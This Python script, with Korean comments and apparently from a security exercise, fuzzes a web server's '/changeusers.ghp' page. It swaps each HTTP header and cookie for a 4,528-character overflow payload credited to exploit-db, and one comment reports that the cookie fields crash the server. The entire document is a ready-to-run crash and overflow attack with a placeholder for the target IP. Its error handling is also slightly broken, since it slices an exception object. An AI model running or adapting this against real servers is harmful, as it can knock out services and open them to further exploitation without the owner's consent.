import requests
import copy  # copy 라이브러리

host = "http://@.@.@.@"  # Insert your IP
uri = "/changeusers.ghp"

# Json type
org_headers = {
    "User-Agent": "Mozilla/4.0",
    "Host": host.split("://")[1],
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-us",
    "Accept-Encoding": "gzip, deflate",
    "Referer": host,
    "Conection": "Keep-Alive"
}

org_cookies = {
    "SESSIONID": "6771",
    "UserID": "id",
    "PassWD": "password"
}

payload = "A" * 4528  # Bug!! ::exploit.db

for key in list(org_headers.keys()):
    print("Header", key, end=": ")
    try:
        headers = copy.deepcopy(org_headers)
        headers[key] = payload
        res = requests.get(host + uri, headers=headers, cookies=org_cookies)
        print(": Good!")
    except Exception as e:
        print(e[:10])

# 실행시 쿠키값과 관련된 부분에서 에러가 발생하여 호스트와의 연결이 끊어졌음을 알 수 있다.
for key in list(org_cookies.keys()):
    print("Cookie", key, end=": ")
    try:
        cookies = copy.deepcopy(org_cookies)
        cookies[key] = payload
        res = requests.get(host + uri, headers=org_headers, cookies=cookies)
        print(": Good!")
    except Exception as e:
        print(e[:10])
